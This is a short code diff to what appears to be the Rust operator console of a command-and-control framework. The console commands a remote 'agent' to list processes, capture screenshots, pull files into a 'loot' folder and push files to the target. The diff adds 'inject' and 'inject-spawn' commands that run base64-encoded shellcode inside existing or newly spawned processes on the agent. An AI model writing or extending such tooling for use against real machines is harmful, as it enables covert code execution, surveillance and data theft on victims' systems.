@@ -114,6 +114,8 @@ impl App {
                  ps                list processes on the agent\n  \
                  screenshot        capture the agent's screen into ./loot\n  \
                  messagebox [title] [text]  show a dialog on the agent's desktop\n  \
+                 inject <pid> <b64>        run shellcode inside an existing process\n  \
+                 inject-spawn <b64> [exe]  start a process and inject into it\n  \
                  download <path>   pull a file from the agent into ./loot\n  \
                  implant <src> <dst>  push a local file to the agent\n  \
                  tasks             show task history and status\n  \
@@ -132,6 +134,8 @@ impl App {
             "shellcode" => self.handle_shellcode(rest),
             "screenshot" => self.send_to_agent("screenshot", ""),
             "messagebox" => self.send_to_agent("messagebox", rest),
+            "inject" => self.send_to_agent("inject", rest),
+            "inject-spawn" => self.send_to_agent("inject-spawn", rest),
             "tasks" => self.show_tasks(),
             "loot" => self.show_loot(),
             "download" => self.handle_download(rest),
